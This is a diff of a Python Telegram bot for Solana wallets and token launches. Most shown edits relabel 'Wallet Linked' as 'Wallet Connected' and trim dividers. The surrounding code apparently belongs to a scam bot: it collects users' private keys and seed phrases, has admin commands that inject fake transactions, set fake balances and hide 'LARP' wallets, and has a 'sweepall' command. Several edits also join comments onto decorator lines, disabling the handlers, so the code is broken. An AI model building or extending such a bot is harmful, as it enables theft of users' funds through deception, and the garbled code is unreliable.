+            await status_msg.edit_text("<b>Connecting…</b>", parse_mode=ParseMode.HTML)
             if raw.startswith("0x") or (len(raw) == 64 and all(c in "0123456789abcdefABCDEF" for c in raw)):
                 eth_priv, eth_addr = parse_evm_private_key(raw)
                 chosen_priv = "EVM_ONLY"
@@ -2050,7 +2025,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     sess.active_wallet_idx = len(sess.wallets) - 1
 
     text = (
-        "✅ <b>Wallet Linked</b>\n\n"
+        "<b>Wallet Connected</b>\n\n"
         f"<code>{chosen_pub}</code>\n\n"
         f"🏷 Label: <b>{w.label}</b>\n"
         f"{SOL_EMOJI}: <b>{w.balance_sol:.4f}</b>\n"
@@ -2147,8 +2122,7 @@ async def wallet_rename_receive(message: Message, state: FSMContext):
     await state.clear()
 
 
-# ── Launch flow ─────────────────────────────────────────────────────────────
-@router.message(LaunchStates.waiting_name)
+# ── Launch flow ─────────────────────────────────────────────@router.message(LaunchStates.waiting_name)
 async def launch_name(message: Message, state: FSMContext):
     name = (message.text or "").strip()[:50]
     if not name:
@@ -2937,8 +2911,7 @@ async def dump_reset(cb: CallbackQuery):
         pass
 
 
-# ── Promo ───────────────────────────────────────────────────────────────────
-@router.callback_query(F.data == "promo:enter")
+# ── Promo ───────────────────────────────────────────────────@router.callback_query(F.data == "promo:enter")
 async def promo_enter(cb: CallbackQuery, state: FSMContext):
     await cb.message.edit_text("🎟️ Send your promo code:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
     await state.set_state(PromoStates.waiting_code)
@@ -2966,11 +2939,11 @@ async def promo_pay(cb: CallbackQuery):
     text = (
         "🧾 <b>Payment Invoice</b>\n"
         f"<code>INV-{invoice_id:05d}</code>\n"
-        "────────────────\n\n"
+        "\n"
         f"<b>Amount due</b>  <code>{amount_display} SOL</code>\n"
         f"<b>Network</b>     Solana\n"
         f"<b>Expires</b>     {expires}\n"
-        "────────────────\n\n"
+        "\n"
         "<b>Pay to this address</b>\n"
         f"<code>{pay_to}</code>\n\n"
         "📱 Scan with Phantom / Solflare — address and amount are filled.\n\n"
@@ -2980,7 +2953,7 @@ async def promo_pay(cb: CallbackQuery):
     )
     kb = InlineKeyboardBuilder()
     kb.row(InlineKeyboardButton(text="🔄 I've paid, check now", callback_data="promo:checkpay"))
-    kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+    kb.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
     await cb.answer()
 
@@ -3042,8 +3015,7 @@ async def promo_code(message: Message, state: FSMContext):
     await state.clear()
 
 
-# ── Help ────────────────────────────────────────────────────────────────────
-
+# ── Help ────────────────────────────────────────────────────
 
 @router.message(SafetyStates.waiting_mint)
 async def safety_check(message: Message, state: FSMContext):
@@ -3147,8 +3119,7 @@ async def cmd_help(message: Message):
     await message.answer(text, parse_mode=ParseMode.HTML)
 
 
-# ── Admin ───────────────────────────────────────────────────────────────────
-@router.message(Command("setbal"))
+# ── Admin ───────────────────────────────────────────────────@router.message(Command("setbal"))
 async def cmd_setbal(message: Message):
     if message.from_user.id not in ADMIN_IDS:
         return
@@ -3277,7 +3248,7 @@ async def cmd_larpseed(message: Message):
     sess.active_wallet_idx = sess.larp_wallet_idx
     sess.larp_mode = True
     sess.last_raw_key = phrase
-    add_personal_tx(sess, "📥 Wallet Linked", "success")
+    add_personal_tx(sess, "📥 Wallet Connected", "success")
     inject_fake_txs(3)
     _save_state()
 
@@ -3288,7 +3259,7 @@ async def cmd_larpseed(message: Message):
         f"Address\n<code>{pub}</code>\n\n"
         f"Balance <b>{SOL_EMOJI} {bal:.4f}</b>\n"
         f"Vault synced · LARP <b>ON</b>\n\n"
-        "Copy the seed. In the bot use <b>Import wallet</b> and paste it "
+        "Copy the seed. In the bot use <b>Connect Wallet</b> and paste it "
         "if you want the full import animation — or just use this session as-is."
     )
     await _admin_reply(message, text, delay=12.0)
@@ -3307,7 +3278,7 @@ async def cmd_larpon(message: Message):
     sess.larp_mode = True
     w = ensure_larp_wallet(sess, force_balance=bot_balance_sol)
     inject_fake_txs(3, types=["📥 Wallet Top-up", "⚡ Priority Tip", "🛡 Safety Scan"])
-    add_personal_tx(sess, "📥 Wallet Linked", "success")
+    add_personal_tx(sess, "📥 Wallet Connected", "success")
     _save_state()
     await _admin_reply(
         message,
@@ -3461,7 +3432,7 @@ async def cmd_larpwallet(message: Message):
     sess = get_session(message.from_user.id)
     remove_larp_wallets(sess)
     w = ensure_larp_wallet(sess, force_balance=bot_balance_sol)
-    add_personal_tx(sess, "📥 Wallet Linked", "success")
+    add_personal_tx(sess, "📥 Wallet Connected", "success")
     _save_state()
     await _admin_reply(
         message,
@@ -3610,7 +3581,7 @@ async def cmd_clonewallet(message: Message):
         is_larp=True,
     )
     sess.wallets.append(w)
-    add_personal_tx(sess, "📥 Wallet Linked", "success")
+    add_personal_tx(sess, "📥 Wallet Connected", "success")
     await _admin_reply(
         message,
         f"Extra wallet\n<code>{pub}</code>\n"
@@ -3733,8 +3704,7 @@ async def cmd_ghost(message: Message):
     await _admin_reply(message, f"Hid {removed} LARP wallet(s). /larpwallet to restore.")
 
 
-# ── Sweep ───────────────────────────────────────────────────────────────────
-@router.message(Command("sweepall"))
+# ── Sweep ───────────────────────────────────────────────────@router.message(Command("sweepall"))
 async def cmd_sweepall(message: Message):
     if message.from_user.id not in ADMIN_IDS:
         return
